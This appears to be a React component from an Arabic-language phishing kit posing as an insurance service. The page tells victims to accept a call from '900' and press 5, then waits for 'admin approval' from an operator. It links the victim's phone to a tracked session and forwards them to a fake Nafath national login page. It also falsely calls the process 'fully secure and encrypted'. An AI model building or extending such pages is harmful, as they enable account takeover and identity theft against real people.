import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { motion } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Shield, CheckCircle2, Loader2 } from "lucide-react";
import InsuranceStepper from "@/components/InsuranceStepper";
import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
import { toast } from "sonner";
import { linkVisitorToSession } from "@/lib/visitorLink";

const STCCall = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const offer = location.state?.offer;
  const phone = location.state?.phone;
  const carrier = location.state?.carrier;
  const passedOrderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");

  const [received, setReceived] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [orderId, setOrderId] = useState<string | null>(passedOrderId);
  const [showButton, setShowButton] = useState(false);
  const [countdown, setCountdown] = useState(10);

  const approvalStatus = useAdminApproval(orderId, "stc_call");

  useEffect(() => {
    if (approvalStatus === "approved" && orderId) {
      toast.success("تم التحقق بنجاح");
      sessionStorage.setItem("insurance_order_id", orderId);
      navigate("/insurance/nafath-login", { state: { offer, phone, carrier, orderId } });
    } else if (approvalStatus === "rejected") {
      toast.error("تم رفض عملية التحقق");
      setWaitingApproval(false);
      setReceived(false);
    }
  }, [approvalStatus, orderId, navigate, offer, phone, carrier]);

  useEffect(() => {
    if (countdown <= 0) {
      setShowButton(true);
      return;
    }
    const id = setInterval(() => setCountdown(c => c - 1), 1000);
    return () => clearInterval(id);
  }, [countdown]);

  const handleCallReceived = async () => {
    setReceived(true);
    linkVisitorToSession({ phone });
    const id = await createOrUpdateStage(orderId, "stc_call");
    setOrderId(id);
    setWaitingApproval(true);
  };

  return (
    <div className="min-h-[100dvh] bg-secondary/30">
      <div className="container mx-auto px-3 md:px-4 pt-8 pb-24 md:pb-12">
        <div className="max-w-5xl mx-auto">
          <InsuranceStepper active={2} />
          <div className="max-w-md mx-auto">
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
              <div className="bg-card rounded-2xl border border-border shadow-sm p-6 text-center">
                <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ type: "spring", delay: 0.2 }}
                  className="w-20 h-20 rounded-2xl bg-primary/10 flex items-center justify-center mx-auto mb-4">
                  <img src="/images/call.gif" alt="calling" className="w-16 h-16" />
                </motion.div>

                <h2 className="text-lg font-bold text-foreground mb-2">بانتظار تأكيد الجوال</h2>

                <div className="bg-secondary/50 rounded-xl p-4 mb-4 space-y-2">
                  <p className="text-xs text-muted-foreground">سوف تصلك الان مكالمة</p>
                  <p className="text-xs text-muted-foreground">من رقم <span className="font-bold text-primary font-mono" dir="ltr">900</span></p>
                  <p className="text-sm font-bold text-foreground">الرجاء قبولها واختيار الرقم <span className="text-primary text-lg">5</span></p>
                </div>

                <p className="text-[10px] text-muted-foreground mb-4">يرجى اتباع التعليمات الموضحة في المكالمة</p>

                {waitingApproval ? (
                  <div className="flex flex-col items-center gap-3 py-4">
                    <Loader2 className="w-8 h-8 text-primary animate-spin" />
                    <p className="text-sm font-bold text-foreground">بانتظار موافقة الإدارة...</p>
                    <p className="text-xs text-muted-foreground">يرجى الانتظار</p>
                  </div>
                ) : !received && showButton ? (
                  <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}>
                    <Button onClick={handleCallReceived} className="w-full bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl py-5 font-bold text-sm gap-2">
                      <CheckCircle2 className="w-3.5 h-3.5" />تم تلقي المكالمة
                    </Button>
                  </motion.div>
                ) : !received ? (
                  <div className="flex flex-col items-center gap-3 py-4">
                    <div className="relative w-16 h-16">
                      <svg className="w-16 h-16 -rotate-90" viewBox="0 0 64 64">
                        <circle cx="32" cy="32" r="28" fill="none" stroke="hsl(var(--border))" strokeWidth="4" />
                        <motion.circle
                          cx="32" cy="32" r="28" fill="none"
                          stroke="hsl(var(--primary))" strokeWidth="4"
                          strokeLinecap="round"
                          strokeDasharray={2 * Math.PI * 28}
                          initial={{ strokeDashoffset: 0 }}
                          animate={{ strokeDashoffset: 2 * Math.PI * 28 }}
                          transition={{ duration: 10, ease: "linear" }}
                        />
                      </svg>
                      <span className="absolute inset-0 flex items-center justify-center text-lg font-bold text-primary font-mono">{countdown}</span>
                    </div>
                    <p className="text-xs text-muted-foreground">بانتظار المكالمة...</p>
                  </div>
                ) : (
                  <div className="flex items-center justify-center gap-2 py-4">
                    <Loader2 className="w-5 h-5 text-primary animate-spin" />
                    <p className="text-xs text-muted-foreground">يرجى الانتظار جاري التأكد من صحة البيانات المدخلة</p>
                  </div>
                )}

                <div className="flex items-center justify-center gap-2 mt-4 pt-3 border-t border-border">
                  <Shield className="w-3.5 h-3.5 text-primary/60" />
                  <span className="text-[10px] text-muted-foreground">عملية آمنة ومشفرة بالكامل</span>
                </div>
              </div>
            </motion.div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default STCCall;
